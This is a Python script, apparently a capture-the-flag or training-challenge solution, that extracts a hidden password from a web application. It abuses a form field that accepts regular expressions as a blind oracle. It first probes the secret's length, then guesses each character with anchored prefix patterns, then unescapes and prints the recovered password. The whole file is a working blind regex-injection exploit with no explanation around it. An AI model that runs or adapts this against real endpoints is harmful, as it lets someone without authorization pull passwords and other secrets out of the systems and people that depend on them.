from requests import post
from string import printable
url='https://learn-gcp-286602.uc.r.appspot.com/'
def check(regex_pattern):
    if post(url, data = {'regexCheck': regex_pattern } ).text.find("success")==-1: return False
    else: return True
Nombre=1
while True:
    x=".{"+str(Nombre)+"}"
    if not check(x):break
    Nombre=Nombre+1
length=Nombre-1
origin=""
i=1
while not (i>length):
    for car in printable:
        if car=="*" or car =="(" or car ==")":continue
        if printable.find(car)>=62: car="\\"+car
        x="^"+origin+car
        if check(x):break
    origin+=car
    print(origin)
    i+=1
print(origin)
password=""
i=0
while not (i>len(origin)-1):
    if origin[i]=="\\":
        password=password+origin[i+1]
        i+=1
    else: password=password+origin[i]
    i+=1
print(password)